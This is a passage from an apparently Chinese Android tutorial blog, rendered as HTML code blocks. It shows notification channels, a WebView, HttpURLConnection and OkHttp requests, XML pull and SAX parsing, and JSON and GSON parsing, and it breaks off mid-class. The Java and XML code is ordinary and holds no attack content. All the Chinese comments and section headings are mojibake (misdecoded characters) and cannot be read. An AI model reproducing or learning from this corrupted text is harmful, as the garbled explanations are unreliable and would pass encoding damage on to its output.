defineï¼Œè¿™é‡Œçš„ï¼‘å¯ä»¥è‡ªå®šä¹‰ï¼Œåªè¦æ˜¯ç‹¬ä¸€æ— äºŒçš„å°±å¯ï¼ŒnotificationID</span></span><br><span class="line">                notificationManager.notify(<span class="number">1</span>, builder.build());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi(api = Build.VERSION_CODES.O)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createNotificationChannel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Create the NotificationChannel, but only on API 26+ because</span></span><br><span class="line">        <span class="comment">// the NotificationChannel class is new and not in the support library</span></span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) &#123;</span><br><span class="line">            CharSequence name = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            String description = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            <span class="keyword">int</span> importance = NotificationManager.IMPORTANCE_DEFAULT;</span><br><span class="line">            NotificationChannel channel = <span class="keyword">new</span> NotificationChannel(<span class="string">&quot;text&quot;</span>, name, importance);</span><br><span class="line">            channel.setDescription(description);</span><br><span class="line">            <span class="comment">// Register the channel with the system; you can&#x27;t change the importance</span></span><br><span class="line">            <span class="comment">// or other notification behaviors after this</span></span><br><span class="line">            NotificationManager notificationManager = getSystemService(NotificationManager.class);</span><br><span class="line">            notificationManager.createNotificationChannel(channel);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="webview"><a href="#webview" class="headerlink" title="webview"></a>webview</h2><p>MainActivity.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  WebView webView = findViewById(R.id.web_view);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> WebViewClient());</span><br><span class="line">        webView.loadUrl(<span class="string">&quot;https://www.dogedoge.com&quot;</span>);</span><br><span class="line"><span class="comment">//å¦‚æœä¸æ˜¯httpséœ€è¦åœ¨åœ¨AndroidManifestä¸­çš„&lt;applicationæ ‡ç­¾ä¸­åŠ å…¥android:usesCleartextTraffic=&quot;true&quot;</span></span><br><span class="line"><span class="comment">//åŸå› ï¼šé«˜ç‰ˆæœ¬å·²ç»ä¸å…è®¸æ˜æ–‡ä¼ è¾“ï¼ˆä½¿ç”¨httpï¼‰ï¼ˆå› ä¸ºä¸å®‰å…¨ï¼‰ï¼Œæ‰€ä»¥ä½¿ç”¨android:usesCleartextTraffic=&quot;true&quot;å¼ºåˆ¶å…è®¸æ˜æ–‡ä¼ è¾“</span></span><br></pre></td></tr></table></figure>

<p>manifest.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>activity_main.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/web_view&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>







<h2 id="httpConnection"><a href="#httpConnection" class="headerlink" title="httpConnection"></a>httpConnection</h2><ul>
<li><p>åŸç”Ÿå®ç°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   TextView responseText;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(v.getId() == R.id.send_request)</span><br><span class="line">            sendrequestWithHttpURLConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendrequestWithHttpURLConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//å¼€å¯çº¿ç¨‹æ¥å‘èµ·ç½‘ç»œè¯·æ±‚</span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">                BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://www.dogedoge.com&quot;</span>);</span><br><span class="line">                connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                connection.setConnectTimeout(<span class="number">8000</span>);</span><br><span class="line">                connection.setReadTimeout(<span class="number">8000</span>);</span><br><span class="line">                InputStream in = connection.getInputStream();</span><br><span class="line"><span class="comment">//                ä¸‹é¢å¯¹è·å–åˆ°çš„è¾“å…¥æµè¿›è¡Œè¯»å–</span></span><br><span class="line">                reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">                StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">                    response.append(line);</span><br><span class="line"></span><br><span class="line">                showResponse(response.toString());</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(reader!=<span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        reader.close();</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (IOException e)</span><br><span class="line">                    &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(connection != <span class="keyword">null</span>)</span><br><span class="line">                    connection.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span>  <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//                å‘ˆç°ç»“æœåˆ°ç•Œé¢ä¸Š</span></span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">   &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/send_request&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;send request&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/response_text&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--ScrollViewä¿è¯å¯ä»¥æ»šåŠ¨--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>okhttpå®ç°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    TextView responseText;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(v.getId() == R.id.send_request)</span><br><span class="line">            sendRequestWithOkHttp();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">//ä½¿ç”¨okhttpåº“</span></span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">&quot;https://www.dogedoge.com&quot;</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responeseData = response.body().string();</span><br><span class="line">                    showResponse(responeseData);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span>  <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//                å‘ˆç°ç»“æœåˆ°ç•Œé¢ä¸Š</span></span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="è§£æxml"><a href="#è§£æxml" class="headerlink" title="è§£æxml"></a>è§£æxml</h3><h4 id="pullè§£æ"><a href="#pullè§£æ" class="headerlink" title="pullè§£æ"></a>pullè§£æ</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">              <span class="keyword">try</span>&#123;</span><br><span class="line">                  <span class="comment">//ä½¿ç”¨okhttpå®ç°</span></span><br><span class="line">                  OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                  Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                          .url(<span class="string">&quot;http://10.0.2.2:88/get_data.xml&quot;</span>)<span class="comment">//æ¨¡æ‹Ÿå™¨è®¿é—®å®¿ä¸»æœºæœ¬åœ°æœåŠ¡localhost</span></span><br><span class="line">                          .build();</span><br><span class="line">                  Response response = client.newCall(request).execute();</span><br><span class="line">                  String responseData = response.body().string();</span><br><span class="line">                  parseXMLWithPull(responseData);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">catch</span> (Exception e)</span><br><span class="line">              &#123;</span><br><span class="line">                  e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;).start();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithPull</span><span class="params">(String xmlData)</span></span>&#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              XmlPullParserFactory factory = XmlPullParserFactory.newInstance();</span><br><span class="line">              XmlPullParser xmlPullParser = factory.newPullParser();</span><br><span class="line">              xmlPullParser.setInput(<span class="keyword">new</span> StringReader(xmlData));</span><br><span class="line">              <span class="keyword">int</span> eventType = xmlPullParser.getEventType();</span><br><span class="line">              String id=<span class="string">&quot;&quot;</span>;</span><br><span class="line">              String name =<span class="string">&quot;&quot;</span>;</span><br><span class="line">              String version = <span class="string">&quot;&quot;</span>;</span><br><span class="line">              <span class="keyword">while</span>(eventType != xmlPullParser.END_DOCUMENT)</span><br><span class="line">              &#123;</span><br><span class="line">                  String nodename = xmlPullParser.getName();</span><br><span class="line">                  <span class="keyword">switch</span> (eventType)</span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="keyword">case</span> XmlPullParser.START_TAG:</span><br><span class="line">                      &#123;</span><br><span class="line">                          <span class="keyword">if</span>(<span class="string">&quot;id&quot;</span>.equals(nodename))</span><br><span class="line">                              id = xmlPullParser.nextText();</span><br><span class="line">                          <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;name&quot;</span>.equals(nodename))</span><br><span class="line">                              name = xmlPullParser.nextText();</span><br><span class="line">                          <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;version&quot;</span>.equals(nodename))</span><br><span class="line">                              version = xmlPullParser.nextText();</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">case</span> XmlPullParser.END_TAG:</span><br><span class="line">                      &#123;</span><br><span class="line">                          <span class="keyword">if</span>(<span class="string">&quot;app&quot;</span>.equals(nodename))</span><br><span class="line">                          &#123;</span><br><span class="line">                              Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is&quot;</span>+id);</span><br><span class="line">                              Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is&quot;</span>+name);</span><br><span class="line">                              Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is&quot;</span>+version);</span><br><span class="line">                          &#125;</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">default</span>:</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  eventType = xmlPullParser.next();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">          &#123;</span><br><span class="line">              e.printStackTrace();</span><br><span class="line">          &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h4 id="saxè§£æ"><a href="#saxè§£æ" class="headerlink" title="saxè§£æ"></a>saxè§£æ</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">&quot;http://10.0.2.2:88/get_data.xml&quot;</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseXMLWithSAX(responseData);</span><br><span class="line"><span class="comment">//                    parseXMLWithPull(responseData);</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseXMLWithSAX</span><span class="params">(String xmlData)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">            XMLReader xmlReader = factory.newSAXParser().getXMLReader();</span><br><span class="line">            ContentHandler handler= <span class="keyword">new</span> ContentHandler();</span><br><span class="line">            <span class="comment">//å°†ContentHandlerçš„å®ä¾‹è®¾ç½®åˆ°XMLReaderä¸­</span></span><br><span class="line">            xmlReader.setContentHandler(handler);</span><br><span class="line">            <span class="comment">//å¼€å§‹æ‰§è¡Œè§£æ</span></span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(xmlData)));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ContentHandler</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContentHandler</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String nodeName;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder id;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder name;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder version;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span><span class="params">(<span class="keyword">char</span>[] ch, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">//æ ¹æ®å½“å‰ç»“ç‚¹å°†å†…å®¹æ·»åŠ åˆ°å“ªä¸€ä¸ªStringBuilderå¯¹è±¡ä¸­</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;id&quot;</span>.equals(nodeName))</span><br><span class="line">            id.append(ch,start,length);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;name&quot;</span>.equals(nodeName))</span><br><span class="line">            name.append(ch,start,length);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;version&quot;</span>.equals(nodeName))</span><br><span class="line">            version.append(ch, start, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line"><span class="comment">//        è®°å½•å½“å‰ç»“ç‚¹å</span></span><br><span class="line">        nodeName = localName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.endDocument();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;app&quot;</span>.equals(localName))</span><br><span class="line">        &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;id is &quot;</span>+id.toString().trim() );</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;name is &quot;</span>+name.toString().trim() );</span><br><span class="line">            Log.d(<span class="string">&quot;ContentHandler&quot;</span>, <span class="string">&quot;version is &quot;</span>+version.toString().trim() );</span><br><span class="line">            <span class="comment">//æ¸…ç©ºStringBuilder</span></span><br><span class="line">            id.setLength(<span class="number">0</span>);</span><br><span class="line">            name.setLength(<span class="number">0</span>);</span><br><span class="line">            version.setLength(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        name = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        version = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="è§£æjson"><a href="#è§£æjson" class="headerlink" title="è§£æjson"></a>è§£æjson</h3><h4 id="JSONobjectè§£æ"><a href="#JSONobjectè§£æ" class="headerlink" title="JSONobjectè§£æ"></a>JSONobjectè§£æ</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                        .url(<span class="string">&quot;http://10.0.2.2:88/get_data.json&quot;</span>)</span><br><span class="line">                        .build();</span><br><span class="line">                Response response = client.newCall(request).execute();</span><br><span class="line">                String responseData = response.body().string();</span><br><span class="line">                parseJSONWithJSONObject(responseData);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithJSONObject</span><span class="params">(String jsonData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        JSONArray jsonArray = <span class="keyword">new</span> JSONArray(jsonData);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;jsonArray.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            JSONObject jsonObject = jsonArray.getJSONObject(i);</span><br><span class="line">            String id = jsonObject.getString(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            String name = jsonObject.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            String version = jsonObject.getString(<span class="string">&quot;version&quot;</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is&quot;</span>+id);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is&quot;</span>+name);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is&quot;</span>+version);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;e.printStackTrace();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="GSONè§£æ"><a href="#GSONè§£æ" class="headerlink" title="GSONè§£æ"></a>GSONè§£æ</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">&#x27;com.google.code.gson:gson:2.8.6&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æ–°å»ºä¸€ä¸ªAppç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.networktest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StringBuilder id;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder name;</span><br><span class="line">    <span class="keyword">private</span> StringBuilder version;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(StringBuilder id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(StringBuilder name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVersion</span><span class="params">(StringBuilder version)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.version = version;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StringBuilder <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StringBuilder <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span 